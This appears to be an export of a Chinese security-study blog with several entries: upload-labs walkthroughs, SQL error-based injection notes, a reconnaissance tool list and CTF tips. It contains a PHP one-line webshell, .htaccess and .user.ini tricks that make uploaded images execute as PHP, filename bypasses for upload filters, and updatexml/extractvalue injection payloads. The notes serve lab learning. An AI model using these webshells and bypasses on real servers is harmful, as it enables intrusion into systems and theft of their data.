<p>Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。</p>
<h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。</p>
<h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><p>JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</p>
]]></content>
      <tags>
        <tag>内存马</tag>
      </tags>
  </entry>
  <entry>
    <title>博客的创建</title>
    <url>/2024/08/04/%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
    <content><![CDATA[<p>搭建过程：<br>    先本地连接GitHub，再在GitHub里创建仓库，然后本地安装hexo，最后将hexo程序上传到GitHub。<br>遇到问题：<br>    1. 初始化hexo时弄错了文件夹<br>      解决：找到hexo程序所在文件夹使用git base初始化<br>    2：上传hexo时出现找不到github的邮箱和用户名的问题<br>      解决：网上寻找，在.deploy-git中的子文件.git找到config，并输入你的邮箱与用户名就可以解决<br>    &#x2F;&#x2F;之前出错的截图没了<br>    3：无法插入图片<br>      解决：b站（<a href="https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>      在source中创建images文件并将你需要的图片放入然后就可以在md文件中引用图片</p>
]]></content>
  </entry>
  <entry>
    <title>upload1-10</title>
    <url>/2025/02/19/upload1-10/</url>
    <content><![CDATA[<h1 id="webshell-一句话木马"><a href="#webshell-一句话木马" class="headerlink" title="webshell&amp;一句话木马"></a>webshell&amp;一句话木马</h1><p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。</p>
<p>而利用文件上传漏洞进行攻击时最常用的便是一句话木马，通过上传一句话木马文件配合菜刀、蚁剑等webshell连接工具等，获得目标服务器的读取权。</p>
<p>这些博客详细记录了常用的一句话木马以及相关介绍</p>
<p><a href="https://www.cnblogs.com/goodgad/p/13463866.html">常用的一句话木马</a></p>
<p><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">Web安全-一句话木马</a></p>
<h1 id="pass1-前端验证"><a href="#pass1-前端验证" class="headerlink" title="pass1(前端验证)"></a>pass1(前端验证)</h1><p>由于本题是在前端js进行过滤，我们可以直接使用开发者工具删去检查代码就行了。</p>
<p>我们还可以使用bp抓包来上传：</p>
<p>首先将我们的文件后缀名改为不会被过滤的，再使用bp抓包</p>
<p><img src="/../images/b206a2afa85059b9c8d35cbbb6642117.png" alt="b206a2afa85059b9c8d35cbbb6642117" loading="lazy"></p>
<p>我们的文件在这，我们这是把后缀名改为php即可，我们又知道上传的绝对路径，因此可以直接用蚁剑连接。</p>
<h1 id="pass2-数据包修改MIME"><a href="#pass2-数据包修改MIME" class="headerlink" title="pass2(数据包修改MIME)"></a>pass2(数据包修改MIME)</h1><p>我们只需要用bp抓包，把请求体的MIME类型修改成png的MIME类型也就是说image&#x2F;png</p>
<p><img src="/../images/1f5a8d5e3b200a81d39c173c304964bc.png" alt="1f5a8d5e3b200a81d39c173c304964bc" loading="lazy"></p>
<p>便能上传成功。</p>
<h1 id="pass3-过滤了-asp-aspx-php-jsp"><a href="#pass3-过滤了-asp-aspx-php-jsp" class="headerlink" title="pass3(过滤了.asp|.aspx|.php|.jsp)"></a>pass3(过滤了.asp|.aspx|.php|.jsp)</h1><p>除了这几种还有别的类型。</p>
<ul>
<li>ASP：asa&#x2F;cer&#x2F;cdx</li>
<li>ASPX：ashx&#x2F;asmx&#x2F;ascx</li>
<li>PHP：php4&#x2F;php5&#x2F;phtml&#x2F;php3&#x2F;pht</li>
<li>JSP：jspx&#x2F;jspf</li>
</ul>
<p>我们只要上传别的就行。</p>
<h1 id="pass4-htaccess"><a href="#pass4-htaccess" class="headerlink" title="pass4(.htaccess)"></a>pass4(.htaccess)</h1><p>本关把所有基本都给过滤了，我们只借助.htaccess来进行上传。</p>
<p><code>.htaccess</code> 是一个配置文件，用于在Apache HTTP服务器中运行时对网站目录的访问权限和配置进行细粒度控制。它是一个分布式配置文件，意味着它可以在网站的主目录或任何子目录中存在，并对该目录及其所有子目录产生影响。</p>
<p>其中，.htaccess文件中内容<code>SetHandler application/x-httpd-php</code>用来设置当前目录所有文件都使用PHP解析，无论上传任何文件，只要符合php语言代码规范，就会被当做php文件执行。</p>
<p>使用前提</p>
<ol>
<li>要在apache下的<code>httpd.conf</code>文件更改。<br>启用<code>.htaccess</code>，需要修改httpd.conf，启用<code>AllowOverride All</code> ，并可以用AllowOverride限制特定命令的使用。<br>打开httpd.conf文件用文本编辑器打开后,查找</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;muma&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>这些代码意味着会将名为muma的文件当成php脚本执行。</p>
<p>我们先上传这个.htaccess文件再上传muma.png并用蚁剑连接就行了。</p>
<h1 id="pass5-user-ini"><a href="#pass5-user-ini" class="headerlink" title="pass5(.user.ini)"></a>pass5(.user.ini)</h1><h2 id="查看源码："><a href="#查看源码：" class="headerlink" title="查看源码："></a>查看源码：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<ul>
<li>从通过HTTP POST上传的文件中获取文件名，并使用 <code>trim()</code> 函数去除文件名两端的空白字符。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br></pre></td></tr></table></figure>

<ul>
<li>调用 <code>deldot()</code> 函数（这个函数在提供的代码片段中没有定义，但它应该是一个自定义函数，用于删除文件名末尾的点）。这通常是为了防止某些操作系统（如Windows）中隐藏文件名的点。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br></pre></td></tr></table></figure>

<ul>
<li>使用 <code>strrchr()</code> 函数查找文件名中最后一个点的位置，并返回从点开始到字符串末尾的部分，即文件扩展名。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br></pre></td></tr></table></figure>

<ul>
<li>将文件扩展名转换为小写，以确保与 <code>$deny_ext</code> 数组中的扩展名进行比较时大小写不敏感。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure>

<ul>
<li>使用 <code>str_ireplace()</code> 函数去除文件扩展名中的字符串 <code>::$DATA</code>。这可能是一种针对Windows系统的特定文件名攻击的防护措施。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure>

<ul>
<li>使用 <code>trim()</code> 函数去除文件扩展名两端的空白字符。</li>
</ul>
<p>我们可以用修改配置文件来上传，.user.ini实际上就是可以用户自定义的php.ini,不过只能自定义除了PHP_INI_SYSTEM之外的模式具体可以看官网（<a href="https://www.php.net/manual/zh/ini.list.php">PHP: php.ini 配置选项列表 - Manual</a>）</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这里我们利用PHP_INI_PERDIR中的auto_prepend_file和auto_append_file,前者是在加载第一个PHP代码之前先预加载该配置所指示的php文件，后者则是之后。这样就能让所有php文件自动包含某个文件，前提是上传的目录下要有一个正常的php文件。</p>
<p>我们首先上传一个.user.ini的文件，里面的设置为auto_prepend_file&#x3D;muma.png。这里的muma.png里即是我们的一句话木马。我们之后再把muma.png上传，便使得一句话木马能被成功利用。</p>
<h1 id="pass6（大小写）"><a href="#pass6（大小写）" class="headerlink" title="pass6（大小写）"></a>pass6（大小写）</h1><p>本题没有对大小写进行检查，直接改为.PHp就能上传成功。</p>
<p>要注意的是，上传的时候文件名给改了，我们可以在这查看改后的文件名</p>
<p><img src="/../images/c2fo6hak5a22e_a3bf6c5be61f466ca27559897b985bc4.webp" alt="c2fo6hak5a22e_a3bf6c5be61f466ca27559897b985bc4" loading="lazy"></p>
<p><img src="/../images/1740121002657(1).jpg" alt="1740121002657(1)" loading="lazy"></p>
<p>之后便能用蚁剑进行连接。</p>
<h1 id="pass7（空格绕过）"><a href="#pass7（空格绕过）" class="headerlink" title="pass7（空格绕过）"></a>pass7（空格绕过）</h1><p>由于源码中没有删除空格的代码，所以我们可以在后缀名的最后加上一个空格来绕过检查。（网上大都是这样的，不过我暂时没复现成功会上传出错，查资料说是php版本问题，要低于5.3.29，可是修改过后还是不行，之后再试试）</p>
<h1 id="pass8（-绕过）"><a href="#pass8（-绕过）" class="headerlink" title="pass8（.绕过）"></a>pass8（.绕过）</h1><p>由于源码中没有删除.的代码，所以我们直接在文件名最后加上一个.来绕过检测这个也要注意php版本问题。</p>
<h1 id="pass9-DATA绕过"><a href="#pass9-DATA绕过" class="headerlink" title="pass9(::$DATA绕过)"></a>pass9(::$DATA绕过)</h1><h2 id="额外数据流"><a href="#额外数据流" class="headerlink" title="额外数据流"></a>额外数据流</h2><p>一般情况下我们打开一个文件看到的是一个文件的默认数据流，但是windows支持在文件内部创建额外的数据流以保存其他信息，这些额外数据流可以通过在文件名后加上**::$DATA**来访问，例如查看1.txt的额外数据流我们可以访问1.txt::$DATA。</p>
<p>但是windows的文件是不能出现：等特殊字符的，如果有系统会直接去掉，我们正好可以利用这个特性。</p>
<p>我们首先在上传一个木马并且用bp抓包，在bp中在文件名后面加上**::$DATA**,上传到靶机（windows）后，::$DATA被删除，我们便能用蚁剑直接进行连接。</p>
<h1 id="pass10-绕过"><a href="#pass10-绕过" class="headerlink" title="pass10(. .绕过)"></a>pass10(. .绕过)</h1><p>源码和第五关类似，由源码可知对文件名先删了个点再首尾去空，我们只要将文件名设置为.php. .,那么删完末尾还有个点，检测后缀名时会出错，与黑名单配对不上，故能绕过。</p>
]]></content>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>外网信息收集</title>
    <url>/2025/02/17/%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p><strong>参考奇安信攻防社区</strong></p>
<h2 id="0x00-常用工具、资源简记："><a href="#0x00-常用工具、资源简记：" class="headerlink" title="0x00 常用工具、资源简记："></a>0x00 常用工具、资源简记：</h2><table>
<thead>
<tr>
<th align="left">工具、网站</th>
<th align="left">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://www.aizhan.com/">爱站</a>、<a href="https://tool.chinaz.com/">站长工具</a></td>
<td align="left">Whois、备案号、权重、公司名称等</td>
</tr>
<tr>
<td align="left"><a href="https://www.tianyancha.com/">天眼查</a>、<a href="https://www.qichacha.com/">企查查</a>、<a href="https://wx.sogou.com/">搜狗搜索引擎</a></td>
<td align="left">公司注册域名、微信公众号、APP、软件著作权等</td>
</tr>
<tr>
<td align="left"><a href="https://www.zoomeye.org/">ZoomEye</a>、<a href="https://shodan.io/">Shodan</a>、<a href="https://fofa.so/">FOFA</a>、<a href="https://0.zone/">0.Zone</a>、<a href="https://quake.360.cn/quake/#/index">quake</a></td>
<td align="left">网络空间资产搜索引擎</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/wgpsec/ENScan_GO">ENScanGo</a>、<a href="https://beian.miit.gov.cn/#/Integrated/index">ICP备案</a></td>
<td align="left">主域名收集</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/shmilylty/OneForAll">OneForAll</a>、<a href="https://github.com/euphrat1ca/LayerDomainFinder">Layer</a>、<a href="https://opendata.rapid7.com/">Rapid7的开源数据项目</a>、<a href="https://github.com/UnaPibaGeek/ctfr">ctfr</a>、<a href="https://github.com/FortyNorthSecurity/EyeWitness">EyeWitness</a></td>
<td align="left">子域名收集</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/lcvvvv/kscan">Kscan</a>、<a href="https://github.com/0x727/ShuiZe_0x727">ShuiZe_0x727</a>、<a href="https://github.com/TophantTechnology/ARL">ARL灯塔</a>、<a href="https://gobies.org/">Goby</a></td>
<td align="left">自动化、批量信息收集</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/dr0op/bufferfly">Bufferfly</a>、<a href="https://github.com/EdgeSecurityTeam/EHole">Ehole</a></td>
<td align="left">资产处理、信息筛选</td>
</tr>
<tr>
<td align="left"><a href="https://dnsdb.io/zh-cn/">dnsdb</a>、<a href="https://github.com/christophetd/CloudFlair">CloudFlair</a></td>
<td align="left">CDN相关</td>
</tr>
<tr>
<td align="left"><a href="https://www.virustotal.com/">VirusTotal</a>、<a href="https://x.threatbook.cn/">微步</a>、<a href="https://github.com/Sma11New/ip2domain">ip2domain</a></td>
<td align="left">C段、域名&#x2F;ip情报信息</td>
</tr>
<tr>
<td align="left"><a href="https://nmap.org/">Nmap</a>、<a href="https://github.com/robertdavidgraham/masscan">Masscan</a></td>
<td align="left">端口服务信息</td>
</tr>
<tr>
<td align="left">Google Hacking、<a href="https://github.com/maurosoria/dirsearch">dirsearch</a>、<a href="https://github.com/pingc0y/URLFinder">URLFinder</a></td>
<td align="left">WEB站点信息、api接口等</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/EnableSecurity/wafw00f">wafw00f</a></td>
<td align="left">waf识别</td>
</tr>
<tr>
<td align="left"><a href="http://www.yunsee.cn/">云悉</a>、<a href="http://finger.tidesec.net/home/index/index.html">潮汐</a>、<a href="https://www.whatweb.net/">WhatWeb</a></td>
<td align="left">在线CMS识别</td>
</tr>
<tr>
<td align="left"><a href="https://www.qimai.cn/">七麦</a>、<a href="https://www.xiaolanben.com/pc">小蓝本</a></td>
<td align="left">APP资产</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/TheKingOfDuck/ApkAnalyser">ApkAnalyser</a></td>
<td align="left">App敏感信息</td>
</tr>
<tr>
<td align="left"><a href="https://wy.zone.ci/">乌云漏洞库</a>、<a href="http://www.cnnvd.org.cn/">CNVD</a>、<a href="https://github.com/tomnomnom/waybackurls"><strong>waybackurls</strong></a></td>
<td align="left">历史漏洞、历史资产等</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/n0tr00t/Sreg">n0tr00t&#x2F;Sreg</a>、reg007</td>
<td align="left">个人隐私信息</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/obheda12/GitDorker">GitDorker</a></td>
<td align="left">资产信息、源码泄露</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/laramies/theHarvester">theHarvester</a>、<a href="https://app.snov.io/">Snov.io</a></td>
<td align="left">邮箱信息收集</td>
</tr>
<tr>
<td align="left"><a href="https://start.me/p/GE7JQb/osint">OSINT开源情报和侦擦工具</a></td>
<td align="left">开源情报资源导航</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/cnrstar/anti-honeypot">anti-honeypot</a>、<a href="https://send-safe-honeypot-hunter.apponic.com/">Honeypot Hunter</a></td>
<td align="left">蜜罐识别</td>
</tr>
</tbody></table>
<h1 id="1-1收集域名信息"><a href="#1-1收集域名信息" class="headerlink" title="1.1收集域名信息"></a>1.1收集域名信息</h1><p>收集DNS服务器信息和注册人的联系信息等。收集方法有以下几种。</p>
<h2 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h2><p>简单来说，Whois就是一个用于查询域名是否已经被注册以及注册域名的详细信息的数据库，得到注册人的信息很有用，我们能通过社交网站或者搜索引擎获取很多信息。</p>
]]></content>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>思科</title>
    <url>/2024/11/11/%E6%80%9D%E7%A7%91/</url>
    <content><![CDATA[<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241111161000.jpg" alt="微信图片_20241111161000" loading="lazy"></p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241111160951.jpg" alt="微信图片_20241111160951" loading="lazy"></p>
]]></content>
      <tags>
        <tag>思科模拟器</tag>
      </tags>
  </entry>
  <entry>
    <title>报错注入</title>
    <url>/2024/12/25/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h1><p>见less5</p>
<h1 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h1><p><strong>updatexml‌函数的基本语法：</strong><br>updatexml(xml_document, XPath_string, new_value)</p>
<p>其中，xml_document是XML文档对象，XPath_string是Xpath路径表达式，new_value是更新后的内容。在报错注入中，我们通常将第一个和第三个参数设置为任意值，重点是通过第二个参数注入不符合Xpath语法的表达式，从而引起数据库报错，并通过错误信息获取数据。</p>
<h5 id="XPath语法基础"><a href="#XPath语法基础" class="headerlink" title="XPath语法基础"></a>XPath语法基础</h5><p>XPath是一种在XML文档中查找信息的语言，使用路径表达式来选取节点。XPath支持多种节点类型，包括元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点。XPath语法使用<strong>关系运算符（如&#x2F;和&#x2F;&#x2F;）</strong>来连接步骤，描述节点的位置关系‌</p>
<p><strong>正确使用时：</strong></p>
<p><code>updatexml(&#39;&lt;h1&gt;hello&lt;/h1&gt;&#39;,&#39;/h1&#39;,&#39;x&#39;)</code></p>
<p>这个语法的作用是将hello换成了x。</p>
<p><strong>报错时的使用：</strong></p>
<p>我们可以通过修改XPath的语句进而构成语法错误。</p>
<p>例如：<code>updatexml(&#39;hello&#39;,concat(&#39;--&#39;,(select version()),&#39;--&#39;),&#39;x&#39;)</code></p>
<p>这样就会爆出类似<code>XPATH syntax error : &#39;--5.7.26--&#39;</code>的语句。</p>
<h1 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h1><p><strong>extractvalue‌函数的基本语法</strong><br><code>extractvalue(xml_frag, xpath_expr)</code><br>其中，xml_frag是XML片段，xpath_expr是Xpath表达式。在报错注入中，通过提供一个无效的Xpath表达式，导致函数报错，从而获取数据。</p>
<p><strong>例如</strong></p>
<p><code>extractvalue(1,concat(0x7e,(select database())))</code></p>
<p>便会返回数据库名称。</p>
]]></content>
      <tags>
        <tag>sqlilab注入 web</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界知识点</title>
    <url>/2025/03/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<h1 id="php短标签绕过"><a href="#php短标签绕过" class="headerlink" title="php短标签绕过"></a>php短标签绕过</h1><p>在easyupload中，我们使用常见的<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></p>
<p>并不能上传成功，这时我们需要绕过。</p>
<h2 id="php中的特殊标签"><a href="#php中的特殊标签" class="headerlink" title="php中的特殊标签"></a>php中的特殊标签</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">php短标签</span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span>  <span class="comment">#前提是开启配置参数short_open_tags=on</span></span><br><span class="line"><span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span>  等价于 <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span>  <span class="comment">#不需要开启参数设置</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;   <span class="comment">#开启配置参数asp_tags=on，并且只能在7.0以下版本使用</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="comment">#不需要修改参数开关，但是只能在7.0以下可用。</span></span><br></pre></td></tr></table></figure>



<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="特殊的md5值"><a href="#特殊的md5值" class="headerlink" title="特殊的md5值"></a>特殊的md5值</h2><p>在easyphp中需要我们满足条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;8b184b&#x27; === substr(md5($b),-6,6))</span><br></pre></td></tr></table></figure>

<p>也就是最后6个字符是8b184b的md5值，这里用python脚本暴力破解。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib<span class="comment"># 用于计算 MD5 哈希</span></span><br><span class="line"><span class="keyword">import</span> itertools<span class="comment"># 用于生成字符组合</span></span><br><span class="line"><span class="keyword">import</span> string<span class="comment"># 提供字母和数字的预定义字符集</span></span><br><span class="line"></span><br><span class="line">target_prefix = <span class="string">&quot;8b184b&quot;</span> <span class="comment"># 目标：MD5 哈希值需以 &quot;8b184b&quot; 结尾</span></span><br><span class="line">charset = string.ascii_letters + string.digits  <span class="comment"># 可自定义字符集（例如小写字母、数字）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):  <span class="comment"># 尝试不同长度的输入</span></span><br><span class="line">    <span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(charset, repeat=length):<span class="comment"># 生成字符集的笛卡尔积，其中字符数由length确定</span></span><br><span class="line">        candidate_str = <span class="string">&#x27;&#x27;</span>.join(candidate)<span class="comment">#将生成的元组candidate转换成字符串</span></span><br><span class="line">        hash_md5 = hashlib.md5(candidate_str.encode()).hexdigest()<span class="comment">#将字符串 candidate_str 编码为字节串，计算其MD5散列值，并将其作为十六进制字符串赋值给变量 hash_md5</span></span><br><span class="line">        <span class="keyword">if</span> hash_md5.endswith(target_prefix):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found: &#x27;<span class="subst">&#123;candidate_str&#125;</span>&#x27; -&gt; <span class="subst">&#123;hash_md5&#125;</span>&quot;</span>)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<p>运行得到Found: ‘bDIOS’ -&gt; 9126f37d5c0f9f7473fedf0f0e8b184b</p>
<h2 id="科学计数法绕过"><a href="#科学计数法绕过" class="headerlink" title="科学计数法绕过"></a>科学计数法绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3</span><br></pre></td></tr></table></figure>

<p>遇到这种既要大于600000又要字符串长度小于3的，我们可以使用科学计数法如7e6就是7*10^6。</p>
<h2 id="松散比较"><a href="#松散比较" class="headerlink" title="松散比较"></a>松散比较</h2><p>在做eazyphp时候遇到没开启严格比较的array_search遂可以利用它松散比较的特性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);</span><br><span class="line">       $d === false?die(&quot;no...&quot;):NULL;</span><br><span class="line">       foreach($c[&quot;n&quot;] as $key=&gt;$val)&#123;</span><br><span class="line">           $val===&quot;DGGJ&quot;?die(&quot;no......&quot;):NULL;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>这里用array_search搜索”DGGJ”，但后来又不能有”DGGJ”，可以利用<code>==</code> 的若比较，若把整数与字符串比较，那么字符串就会优先转化成整数，这里是<code>0==&quot;DGGJ&quot;</code>,那DGGJ被转化成整数就是0。</p>
<p><strong>其他类型的比较规则如下</strong></p>
<p>对于多种类型，比较运算符根据下表比较（按顺序）。</p>
<table>
<thead>
<tr>
<th><strong>运算数1 类型</strong></th>
<th><strong>运算数2 类型</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td>null 或 string</td>
<td>string</td>
<td>将 <code>NULL</code> 转换为 “”，进行数字或词汇比较</td>
</tr>
<tr>
<td>bool 或 null</td>
<td>任何其它类型</td>
<td>转换为 bool，<code>FALSE</code> &lt; <code>TRUE</code></td>
</tr>
<tr>
<td>object</td>
<td>object</td>
<td>内置类可以定义自己的比较，不同类不能比较，相同类和数组同样方式比较属性（PHP 4 中），PHP 5 有其自己的说明</td>
</tr>
<tr>
<td>string，resource 或 number</td>
<td>string，resource 或 number</td>
<td>将字符串和资源转换成数字，按普通数学比较</td>
</tr>
<tr>
<td>array</td>
<td>array</td>
<td>具有较少成员的数组较小，如果运算数 1 中的键不存在于运算数 2 中则数组无法比较，否则挨个值比较（见下例）</td>
</tr>
<tr>
<td>object</td>
<td>任何其它类型</td>
<td>object 总是更大</td>
</tr>
<tr>
<td>array</td>
<td>任何其它类型</td>
<td>array 总是更大</td>
</tr>
</tbody></table>
